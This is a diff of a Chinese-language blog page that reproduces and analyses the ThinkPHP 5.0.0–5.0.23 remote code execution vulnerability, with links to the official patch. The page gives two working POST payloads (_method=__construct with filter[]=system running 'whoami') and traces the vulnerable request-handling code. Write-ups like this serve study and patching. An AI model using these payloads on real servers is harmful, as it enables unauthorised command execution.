@@ -92,13 +92,13 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现-md"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现-md" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现.md"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现.md</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
+        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captcha
 
 post_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p>
 <p> 官方补丁地址：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p>
-<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image564"></p>
+<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p>
 <p>其中<code>$this-&gt;{$this-&gt;method}($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p>
 <p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p>
 <pre><code class="php">protected function __construct($options = [])
@@ -132,9 +132,9 @@ post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[RE
 
         ...
     }</code></pre>
-<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1680"></p>
+<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p>
 <p>接着查找调用method()的地方,下断点</p>
-<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1770"></p>
+<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p>
 <p>从入口点App.php开始查看可能作为攻击链一部分的地方</p>
 <p>节选App.php关键内容</p>
 <pre><code class="php">public static function run(Request $request = null)
@@ -248,7 +248,7 @@ post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[RE
 <p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p>
 <p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p>
 <p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>的问题了</p>
-<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5783"></p>
+<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p>
 <p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p>
 <blockquote>
 <p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p>
